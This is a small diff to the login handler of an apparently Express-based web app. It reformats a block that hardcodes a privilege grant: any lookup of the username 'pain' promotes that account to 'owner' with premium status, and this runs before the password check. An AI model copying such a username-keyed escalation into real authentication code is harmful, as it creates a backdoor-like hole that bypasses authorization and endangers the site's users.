@@ -178,7 +178,14 @@ router.post('/login', async (req, res, next) => {
 
   try {
     const user = await User.findOne({ $or: [{ email: identifier }, { username: identifier }] }).select('+passwordHash');
-    if (user && user.username === 'pain' && user.role !== 'owner') {\n      user.role = 'owner';\n      user.premium = true;\n      user.premiumSince = user.premiumSince || new Date();\n      await user.save();\n    }\n\n    if (!user?.passwordHash || !(await verifyPassword(password, user.passwordHash))) {
+    if (user && user.username === 'pain' && user.role !== 'owner') {
+      user.role = 'owner';
+      user.premium = true;
+      user.premiumSince = user.premiumSince || new Date();
+      await user.save();
+    }
+
+    if (!user?.passwordHash || !(await verifyPassword(password, user.passwordHash))) {
       res.status(401).json({ message: 'Incorrect email/username or password.' });
       return;
     }
